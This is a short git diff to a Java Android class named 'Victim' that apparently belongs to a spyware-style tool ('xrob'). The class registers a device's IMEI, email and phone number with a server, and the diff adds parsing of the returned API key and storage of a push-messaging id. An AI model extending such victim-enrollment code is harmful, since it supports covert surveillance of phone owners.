@@ -4,8 +4,11 @@ import android.content.Context;
 
 import com.theah64.xrob.interfaces.JobListener;
 import com.theah64.xrob.utils.APIRequestBuilder;
+import com.theah64.xrob.utils.APIResponse;
 import com.theah64.xrob.utils.OkHttpUtils;
 import com.theah64.xrob.utils.ProfileUtils;
+
+import org.json.JSONException;
 
 import java.io.IOException;
 
@@ -23,8 +26,10 @@ public class Victim {
     private static final String KEY_IMEI = "imei";
     private static final String KEY_EMAIL = "email";
     private static final String KEY_PHONE = "phone";
+    public static final String KEY_FCM_ID = "fcm_id";
     private static String apiKey = null;
     public static final String KEY_API_KEY = "api_key";
+    private static String fcmId;
 
     public static void register(final Context context, final JobListener jobListener) {
 
@@ -55,7 +60,16 @@ public class Victim {
 
             @Override
             public void onResponse(Call call, Response response) throws IOException {
-                final APIRespo
+
+                try {
+                    final APIResponse inResp = new APIResponse(OkHttpUtils.logAndGetStringBody(response));
+                    final String apiKey = inResp.getJSONObjectData().getString(KEY_API_KEY);
+                    setApiKey(apiKey);
+                    jobListener.onJobFinish(apiKey);
+                } catch (JSONException | APIResponse.APIException e) {
+                    e.printStackTrace();
+                    jobListener.onJobFailed(e.getMessage());
+                }
             }
         });
 
@@ -67,5 +81,9 @@ public class Victim {
 
     public static String getAPIKey() {
         return apiKey;
+    }
+
+    public static void setFcmId(String fcmId) {
+        Victim.fcmId = fcmId;
     }
 }
